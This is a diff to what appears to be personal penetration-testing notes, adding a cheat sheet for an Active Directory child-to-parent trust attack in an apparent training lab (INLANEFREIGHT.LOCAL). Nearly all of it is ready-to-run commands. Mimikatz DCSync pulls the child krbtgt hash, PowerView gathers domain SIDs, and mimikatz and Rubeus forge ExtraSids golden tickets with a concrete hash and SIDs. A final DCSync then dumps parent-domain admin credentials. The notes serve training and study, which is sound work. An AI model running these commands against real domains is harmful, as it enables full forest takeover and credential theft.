@@ -3474,6 +3474,60 @@ ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-981
 > psexec.py -k -no-pass corp.local/Administrator@<DC_FQDN>
 > ```
 
+
+>[!check] Attacking Domain Trusts Child->Parent Trusts-from Windows
+
+```
+# ==============================================================================
+# 1. RECONNAISSANCE & INFORMATION GATHERING
+# ==============================================================================
+
+# Extract the child domain's KRBTGT account NT hash via DCSync
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+
+# Get the SID for the current child domain using PowerView
+Get-DomainSID
+
+# Get the Enterprise Admins group SID from the parent domain using PowerView
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+# Alternative built-in method to get the parent Enterprise Admins group SID
+Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
+
+
+# ==============================================================================
+# 2. VERIFICATION & POST-EXPLOITATION TESTING
+# ==============================================================================
+
+# Test for administrative access to the parent Domain Controller's file share
+ls \\academy-ea-dc01.inlanefreight.local\c$
+
+# Check current session memory to confirm the forged Kerberos ticket is injected
+klist
+
+
+# ==============================================================================
+# 3. EXTRASIDS ATTACK CONFIGURATIONS (GOLDEN TICKET GENERATION)
+# ==============================================================================
+
+# Method A: Forge and inject the Golden Ticket into memory using Mimikatz
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+# Method B: Forge and inject the Golden Ticket into memory using Rubeus
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+
+# ==============================================================================
+# 4. PARENT DOMAIN EXPLOITATION (DCSYNC)
+# ==============================================================================
+
+# Perform DCSync against the parent domain to dump target admin credentials
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+
+# Perform DCSync while explicitly targeting the parent FQDN to ensure accurate routing
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+```
+
 > [!example] 💾 Windows CMD: Native Assembly Forging of Persistent Active Directory Corporate Golden Tickets
 > 
 > Generates and injects a custom Golden Ticket directly into local volatile memory using Mimikatz.
